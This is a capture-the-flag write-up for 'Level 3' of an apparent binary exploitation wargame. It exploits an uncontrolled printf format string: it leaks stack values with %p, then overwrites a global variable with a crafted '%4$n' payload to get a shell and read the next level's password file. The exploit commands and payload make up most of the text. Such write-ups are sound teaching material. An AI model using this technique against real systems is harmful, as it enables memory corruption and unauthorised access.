# Level 3

## Initial Context

- One file: `level3`

## Solving the Challenge

Running the file without any argument block on an input.
The program act like `cat`.

```bash
$ echo | ./level3

$ echo a | ./level3
a
$ echo hello | ./level3
hello
```

But giving a `printf`'s specifiers, it starts to break.

```bash
$ echo '%s' | ./level3
Segmentation fault (core dumped)
```

By looking at the code, we can see that the raw content is passed as the format for a `printf` call.

```c
fgets(buffer, 512, stdin);
printf(buffer);
```

Also looking at the code, there is a condition made with an uninitialized `m` variable.

```c
unsigned m; /* 0x0804988c */

void v()
{
    ...
    if (m == 64 /* 0x40 */) {
        ...
```

We can try an [uncontrolled format string attack](https://en.wikipedia.org/wiki/Uncontrolled_format_string).

If given an access to a `printf`'s format, an attacker can dump the stack by **popping some values** of the stack using `%p`, `%x` or `%s`. And can also write to it using `%n`, which set to the next parameter the number of characters written up until now.

We can put the address we want to override which is `0x0804988c` (or `8c 98 04 08` in LE), and pop values until we can find it back:

```bash
$ python -c 'print "\x8c\x98\x04\x08 %p %p %p %p %p"' | ./level3
?? 0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x20702520
#                              ^ 4th place, what we want
```

By [exploiting a GCC extension](https://stackoverflow.com/a/19327442/7292958), we can force `printf` to use the 4th value directly:

```python
# address
"\x8c\x98\x04\x08"

# padding to produce 64 characters
+ "A" * 60

# write using %n, at the forth argument using $4
+ "%4$n"
```

Let's save it in a file and send it to the vulnerable program:

```bash
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit3
cat /tmp/exploit3 - | ./level3
whoami
level4
cat /home/user/level4/.pass
<flag>
```

## Inspirations

- https://stackoverflow.com/questions/46776664/exploiting-printf-vulnerability-in-c
- https://stackoverflow.com/questions/19327441/gcc-dollar-sign-in-printf-format-string/19327442#19327442
